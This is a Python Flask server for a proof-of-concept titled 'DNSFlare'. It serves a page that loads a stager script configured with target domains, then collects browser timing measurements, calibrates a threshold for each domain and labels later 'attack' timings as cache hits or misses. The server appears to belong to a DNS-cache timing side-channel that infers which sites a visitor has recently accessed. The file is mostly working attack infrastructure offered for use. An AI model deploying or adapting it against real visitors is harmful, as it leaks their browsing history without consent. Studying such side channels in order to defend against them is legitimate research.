from flask import Flask, render_template_string, request, jsonify
import argparse
import logging
from datetime import datetime

app = Flask(__name__)
logging.getLogger('werkzeug').setLevel(logging.ERROR)

parser = argparse.ArgumentParser()
parser.add_argument('--targets', type=str, required=True, help='List of target domains separated by commas')
parser.add_argument('--precision', type=int, default=10, help='Precision for calibration')
parser.add_argument('--calibration-sleep', type=int, default=500, help='Sleep time between calibration flush and measure (ms)')
parser.add_argument('--attack-sleep', type=int, default=5000, help='Sleep time between attack flush and measure (ms)')
args = parser.parse_args()

TARGETS = args.targets.split(',')
PRECISION = args.precision
CALIBRATION_SLEEP = args.calibration_sleep
ATTACK_SLEEP = args.attack_sleep

CALIBRATION = {target: {'hits': [], 'misses': [], 'threshold': None} for target in TARGETS}

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head><title>DNSFlare PoC</title></head>
<body>
    <h1>DNSFlare PoC</h1>
    <p style="font-weight: bold;>Tracklogs at server console.</p>
    <p id="status"  color: blue;">Status...</p>

    <script>
        window.DNSFlareConfig = {
            targets: {{ targets | tojson }},
            precision: {{ precision }},
            calibration_sleep: {{ calibration_sleep }},
            attack_sleep: {{ attack_sleep }}
        };
    </script>

    <script src="{{ url_for('static', filename='stager.js') }}"></script>
</body>
</html>
'''

def timestamp():
    now = datetime.now()
    return f"{{{now.strftime('%H:%M:%S')}:{now.microsecond // 1000:03d}}} "

@app.route('/')
@app.route('/index')
def index():
    return render_template_string(HTML_TEMPLATE, targets=TARGETS, precision=PRECISION, calibration_sleep=CALIBRATION_SLEEP, attack_sleep=ATTACK_SLEEP)

@app.route('/calibrate', methods=['POST'])
def calibrate():
    data = request.get_json()
    target = data.get('target')
    hit = data.get('hit')
    miss = data.get('miss')
    iteration = data.get('iteration')

    CALIBRATION[target]['hits'].append(hit)
    CALIBRATION[target]['misses'].append(miss)

    print(f"{timestamp()}[CALIBRATING] {target} #{iteration}/{PRECISION} | MISS: {miss:.2f}ms | HIT: {hit:.2f}ms")

    if iteration == PRECISION:
        median_hit = sorted(CALIBRATION[target]['hits'])[PRECISION // 2]
        median_miss = sorted(CALIBRATION[target]['misses'])[PRECISION // 2]
        threshold = (median_hit + median_miss) / 2
        CALIBRATION[target]['threshold'] = threshold
        print(f"{timestamp()}[CALIBRATED] {target} | THRESHOLD: {threshold:.2f}ms | HIT MEDIAN: {median_hit:.2f}ms | MISS MEDIAN: {median_miss:.2f}ms")

    return jsonify({"status": "received"}), 200

@app.route('/attack', methods=['POST'])
def attack():
    data = request.get_json()
    target = data.get('target')
    time = data.get('time')

    if CALIBRATION[target]['threshold'] is None:
        return jsonify({"status": "calibrating"}), 200

    prediction = 'HIT' if time <= CALIBRATION[target]['threshold'] else 'MISS'
    print(f"{timestamp()}[ATTACK] {target} | TIME: {time:.2f}ms | PREDICTION: {prediction}")
    return jsonify({"status": "received"}), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)